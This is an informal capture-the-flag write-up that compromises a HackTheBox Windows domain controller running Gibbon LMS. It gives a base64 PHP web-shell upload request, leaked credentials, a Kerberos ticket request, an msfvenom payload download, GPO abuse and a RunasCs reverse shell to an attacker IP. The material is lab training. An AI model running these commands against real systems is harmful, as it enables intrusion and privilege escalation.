Started with a nmap scan
```
22 OpenSSH for windows 9.5
53 DNS
80 Apache 2.4.58 OpenSSL 3.1.3 PHP 8.2.12
88 Kerberos
135 Windows RPC
139 netbios ssn
389
445 smb
```
The nmap scan shows a `robots.txt` on the webhost which goes to `http://frizzdc.frizz.htb/home/` when going to the site there is some `base64` encoded txt saying we will learn syscalls and xss but before going further with the site we going to look at everything else first and see what we can find ran a subdomain scan did not find anything ran nxc and enum4linux and got nothing so going back to the site its pretty much a static site but the `staff login` when we go to the login it takes us to a `/gibbon-LMS/` which is a school platform for school management and its running version `25.0.0` and when looking at the applications for student and staff none of them we can apply for but there is a `notice` saying 
```
WES is migrating applictions and tools to something stronger and its going to be useing Azure AD SSO and is the strongist protocol such as **KERBEROS**
```
after some more testing I found a LFI at `http://frizzdc.frizz.htb/Bibbon-LMS/?q=` and there is a file called `gibbon.sql` and there is a user called `F.Frizzle@frizz.htb` after more searching we found a file upload we can upload a image and trick it to be a php file we now we got code exaction as `w.webservice` 
```
curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \  
-H "Host: frizzdc.frizz.htb" \  
--data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" \  
--data-urlencode "path=shell.php" \  
--data-urlencode "gibbonPersonID=0000000001"
```
we can get a reverse shell using metasploit were in the web folder and there is a `config.php` file with creds for the DB `MrBibbonsDB:MisterBibbs!Parrot!?1` we can also run `net user /domain` to get a list of all users now we need to get access to this database if we go back to the `xampp` folder there is a mysql and we go inside of the bin and were can exacute the program `.\mysql.exe` and use the database `gibbon` and select from `gibbonperson` and we see a username of `f.frizzle` and a password hash we can try to crack and we crack it to `Jenni_Luvs_Magic23` we can SSH into the host so gonna try getting a TGT we need to sync are time 
```
ntdate frizzdc.frizz.htb
impacket-getTGT frizz.htb/'f.frizzle':'passowrd' -dc-ip frizzdc.frizz.htb 
export KRB5CCNAME=f.frizzle.ccache
ssh f.frizzle@frizz.htb -K
```
had to edit my `kerb5.conf` file to auth now we can SSH into the host now we need to run bloodhound and we can see there is something that was removed in the trash can its a `7z` file but we need to get this file to are host so lets make a msfvenom payload and put it on the host with `Invoke-WebRequest` now we have the 7z file we need to extract it and see what's inside in the `waptserver.ini` file we find a base64 encoded password and it decodes to `!suBcig@MehTed!R` now we need to get a TGT for the user `M.SchoolBus` now we have access to this user we know this user has `Admin` prives on the DC so we can use `sharphoundsAbuse` for GPO abuse to get the final flag we need to make a GPO
```
New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
.\SharpGPOAbuse.exe --AddLocalAdmin --USerAccount M.SchoolBus --GPOName GPO-new --force
```
now we also need `RunasC.exe` 
```
.\RunasCs.exe 'M.Schoolbus' 'password' cmd.exe -r myip:5555
```
and now we are admin 